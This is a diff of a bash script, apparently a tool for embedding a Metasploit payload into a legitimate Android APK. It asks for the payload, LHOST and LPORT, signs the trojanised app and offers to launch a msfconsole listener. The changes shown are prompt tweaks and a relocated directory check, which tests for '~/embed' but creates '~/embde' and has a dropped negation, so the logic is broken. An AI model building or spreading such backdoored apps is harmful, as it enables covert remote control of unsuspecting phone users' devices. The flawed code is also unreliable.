@@ -2,6 +2,15 @@
 set -euo pipefail
 IFS=$'\n\t'
 trap ctrl_c 2
+if [ -d ~/embed/handler ]; then
+	mkdir -p ~/embde/handler
+fi
+if [ ! -d ~/embed/finished ]; then
+        mkdir -p ~/embde/finished
+fi
+if [ ! -d ~/embed/unsign ]; then
+        mkdir -p ~/embde/unsign
+fi
 function ctrl_c () {
                 echo "
 		"
@@ -56,8 +65,8 @@ printf "$C [IbyC]$M Let's to configure it$W
 	\n"
 	sleep 2
 
-printf "$C [Set]$G LEGITIM .APK$W"
-	while read -p " >> " APK && [ -z $APK ]; do
+printf "$C [Set]$G LEGITIM .APK >>$W "
+	while read APK && [ -z $APK ]; do
 		printf "\n $R
 		[W] O-ops!! Please set some legitim .Apk
 		$W \n"
@@ -69,29 +78,29 @@ printf "$C [Set]$G LEGITIM .APK$W"
 				SET
 			fi
 
-printf "$C [Set]$G PAYLOAD$W"
-	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
+printf "$C [Set]$G PAYLOAD >>$W "
+	while read PAYLOAD && [ -z $PAYLOAD ]; do
 		printf "\n $R
 		[W] O-ops!! Please set a payload
 		$W \n"
 	done
 
-printf "$C [Set]$G LOCAL HOST$W"
-        while read -p " >> " LHOST && [ -z $LHOST ]; do
+printf "$C [Set]$G LOCAL HOST >>$W "
+        while read LHOST && [ -z $LHOST ]; do
                 printf "\n $R
                 [W] O-ops!! Please set a host
                 $W \n"
 	done
 
-printf "$C [Set]$G LOCAL PORT$W"
-        while read -p " >> " LPORT && [ -z $LPORT ]; do
+printf "$C [Set]$G LOCAL PORT >>$W "
+        while read LPORT && [ -z $LPORT ]; do
                 printf "\n $R
                 [W] O-ops!! Please set a local port
                 $W \n"
         done
 
-printf "$C [Set]$G NAMED YOUR .APK$W"
-	while read -p " >> " MYAPK && [ -z $MYAPK ]; do
+printf "$C [Set]$G NAMED YOUR .APK >>$W "
+	while read MYAPK && [ -z $MYAPK ]; do
 		printf "\n $R
 		[W] O-ops!! Please set a name
 		$W \n"
@@ -109,8 +118,9 @@ printf "$Y	 [!]$G PAYLOAD =$W $PAYLOAD \n"
 printf "$Y	 [!]$G LHOST   =$W $LHOST \n"
 printf "$Y	 [!]$G LPORT   =$W $LPORT \n"
 printf "$Y	 [!]$G YourApk =$W $MYAPK \n"
+printf "(y|Y/n|N) >> "
 echo 
-	while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+	while read yesorno && [ -z $yesorno ]; do
 		printf "\n $R
 		[W] O-ops!! Please answer the question
 		$W \n"
@@ -134,9 +144,9 @@ function sign {
 	printf "$C [IbyC]$M Choose a type of signature
 	\n"
 	printf "$C [1]$G Jarsigner \n"
-	printf "$C [2]$G Apksigner$W
-	\n"
-	while read -p "(1/2) >> " SIGN && [ -z $SIGN ]; do
+	printf "$C [2]$G Apksigner$W\n"
+	printf "(1/2) >> " 
+	while read SIGN && [ -z $SIGN ]; do
 		printf "$R
 		[W] Please, choose an option
 		\n $W"
@@ -173,14 +183,14 @@ function sign {
 }
 function Set_Handler {
 	Banner
-	printf "$C \n [Set]$G LOCAL HOST$W"
-		while read -p " >> " LHOST && [ -z $LHOST ]; do
+	printf "$C \n [Set]$G LOCAL HOST >>$W "
+		while read LHOST && [ -z $LHOST ]; do
 			printf "\n $R
 			[W] O-ops!! Please set a host
 			$W \n"
 		done
-	printf "$C [Set]$G LOCAL PORT$W"
-		while read -p " >> " LPORT && [ -z $LPORT ]; do
+	printf "$C [Set]$G LOCAL PORT >>$W "
+		while read LPORT && [ -z $LPORT ]; do
 			printf "\n $R
 			[W] O-ops!! Please set a local port
 			$W \n"
@@ -192,8 +202,9 @@ function Set_Handler {
         printf "$Y [!]$G PAYLOAD =$W $PAYLOAD \n"
 	printf "$Y         [!]$G LHOST   =$W $LHOST \n"
 	printf "$Y         [!]$G LPORT   =$W $LPORT \n"
+	printf "(y|Y/n|N) >> "
 	echo
-		while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+		while read yesorno && [ -z $yesorno ]; do
 			printf "\n $R
 			[W] O-ops!! Please answer the question
 			$W \n"
@@ -222,18 +233,18 @@ function Msfconsole {
 }
 function Ending {
 	printf "$C \n
-[IbyC]$M Do you wanna start msfconsole handler?$W
-	\n"
-        while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+[IbyC]$M Do you wanna start msfconsole handler?$W\n"
+	printf "(y|Y/n|N) >> "
+        while read yesorno && [ -z $yesorno ]; do
                 printf "\n $R
                 [W] Please, choose an option
                 $W \n"
         done
                 if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
                         Banner
-                        printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W
-                        \n"
-                        while read -p "(y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+                        printf "$C [IbyC]$M Do you wanna use the previous configuration ?$W\n"
+			printf "(y|Y/n|N) >> "
+                        while read yesorno && [ -z $yesorno ]; do
                                 printf "$R
                                 [W] Please, choose an option
                                 $W \n"
@@ -293,13 +304,4 @@ printf "$R       [-] Use At Your Own Risk [-]"
         echo "
 
         "
-if [ ! -d ~/embed/handler ]; then
-	mkdir -p ~/embde/handler
-fi
-if [ ! -d ~/embed/finished ]; then
-	mkdir -p ~/embde/finished
-fi
-if [ ! -d ~/embed/unsign ]; then
-	mkdir -p ~/embde/unsign
-fi
 #					@IbyC.
